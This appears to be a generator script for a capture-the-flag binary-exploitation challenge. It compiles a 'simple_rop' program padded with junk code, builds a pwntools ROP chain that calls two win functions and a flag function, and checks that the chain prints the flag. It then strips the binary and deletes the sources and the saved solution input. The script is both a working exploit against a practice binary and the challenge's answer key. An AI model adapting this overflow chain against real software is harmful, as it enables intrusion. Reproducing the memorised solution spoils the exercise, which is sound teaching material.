import subprocess
import os
import sys
from subprocess import check_output
                    # chals_out/chal_name/team_name so 3
sys.path.insert(1, os.path.join(sys.path[0], '../../..'))
from libchals import *

from pwn import *
context.log_level = 'error'
FNULL = open(os.devnull, 'w')

# junk code generation
write_junk_calls("main.c", 31, 2)
write_junk_calls("main.c", 22)
write_junk_body("main.c", 16)

subprocess.call("make", stdout=FNULL, stderr=FNULL)



# input correction
elf = ELF("simple_rop")
rop = ROP(elf)
win1 = elf.symbols['win_function1']
win2 = elf.symbols['win_function2']
flag = elf.symbols['flag']
POP_ONCE = (rop.find_gadget(['pop ebx', 'ret']))[0]

padding = b'A' * 28

exploit = padding + p32(win1) + p32(win2) + p32(POP_ONCE) + p32(0xBAAAAAAD)
exploit += p32(flag) + p32(POP_ONCE) + p32(0xABADBABE)
# rop is saved as input
f = open("input", "wb")
f.write(exploit)
f.close()


# strip it after the ropchain building so they don't have the symbols but we do
subprocess.call(["strip", "simple_rop"], stdout=FNULL, stderr=FNULL)


# TESTING BINARY
f=open("flag.txt", 'r')
flag = f.readline()
try:
    output = subprocess.check_output("./simple_rop < input", shell=True, stderr=subprocess.STDOUT)
except Exception as e:
    output = str(e.output)
if not flag in output:
    fail_test()



os.remove("main.c")
os.remove("Makefile")
os.remove("setup.py")
# solution
os.remove("input")
